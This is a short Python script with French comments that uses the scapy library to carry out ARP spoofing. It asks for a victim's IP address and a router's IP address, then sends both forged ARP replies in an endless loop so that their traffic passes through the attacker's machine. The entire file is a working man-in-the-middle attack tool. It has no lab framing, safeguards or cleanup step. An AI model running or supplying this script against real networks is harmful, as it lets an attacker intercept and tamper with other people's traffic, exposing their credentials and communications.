#!/usr/bin/env python
import time
import sys
import scapy.all as scapy
# Fonction d'adresse MAC qui renvoie
# l'adresse MAC de l'adresse IP fournie


def get_mac(ip):
	# Création d'une requête ARP vers l'adresse IP
	arp_request = scapy.ARP(pdst=ip)
	#réglage de l'adresse MAC de destination pour la diffusion de l'adresse MAC
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	# combiner le paquet ARP avec le message de diffusion
	arp_request_broadcast = broadcast / arp_request
	
	# renvoie une liste d'adresses MAC avec les adresses MAC et les adresses IP respectives.
	# MAC et les adresses IP correspondantes.
	answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	# nous choisissons la première adresse MAC et sélectionnons
	# l'adresse MAC en utilisant le champ hwsrc
	return answ[0][1].hwsrc


def arp_spoof(target_ip, spoof_ip):
	"""" Ici, le paquet ARP est défini comme une réponse et
	pdst est défini sur l'IP cible
	cible, qu'il s'agisse de la victime ou du routeur, et le hwdst
	est l'adresse MAC de l'IP fournie
	et le psrc est l'adresse IP d'usurpation
	pour manipuler le paquet"""
	
	packet = scapy.ARP(op=2, pdst=target_ip,
					hwdst=get_mac(target_ip), psrc=spoof_ip)
	scapy.send(packet, verbose=False)


victim_ip = input("entrez l'adresse ip de la victim: ")
router_ip = input("entrez l'adresse ip du routeur") 
sent_packets_count = 0 # initialisation du compteur de paquets
while True:
	sent_packets_count += 2
	arp_spoof(victim_ip, router_ip)
	arp_spoof(router_ip, victim_ip)
	print("[+] Packets sent " + str(sent_packets_count), end="\r")
	sys.stdout.flush()
	time.sleep(2)
